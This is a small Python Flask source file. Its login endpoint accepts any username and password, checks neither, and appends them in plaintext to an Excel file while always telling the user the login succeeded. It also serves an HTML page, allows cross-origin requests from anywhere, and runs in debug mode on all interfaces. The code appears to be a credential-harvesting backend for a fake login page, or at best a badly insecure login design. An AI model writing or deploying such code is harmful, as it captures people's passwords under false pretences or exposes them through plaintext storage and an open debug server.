from flask import Flask, request, jsonify, send_file
import pandas as pd
import os
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Enable Cross-Origin Resource Sharing

EXCEL_FILE = "user_logins.xlsx"

def read_excel():
    """Read data from the Excel file, or return an empty DataFrame if it doesn't exist."""
    if not os.path.exists(EXCEL_FILE):
        return pd.DataFrame(columns=["Username", "Password"])
    return pd.read_excel(EXCEL_FILE, engine="openpyxl")

def write_excel(df):
    """Write the DataFrame to the Excel file."""
    df.to_excel(EXCEL_FILE, index=False, engine="openpyxl")

# Serve HTML file
@app.route("/")
def home():
    return send_file("index.html")

# Serve CSS file
@app.route("/styles.css")
def styles():
    return send_file("styles.css")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    
    if not username or not password:
        return jsonify({"message": "Please provide both username and password"}), 400
    
    try:
        df = read_excel()
    except Exception:
        df = pd.DataFrame(columns=["Username", "Password"])
    
    # Append new login data
    new_entry = pd.DataFrame({"Username": [username], "Password": [password]})
    updated_df = pd.concat([df, new_entry], ignore_index=True)
    
    try:
        write_excel(updated_df)
    except Exception as e:
        return jsonify({"message": f"Error saving data: {str(e)}"}), 500
    
    return jsonify({"message": "Login successful and data saved!"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
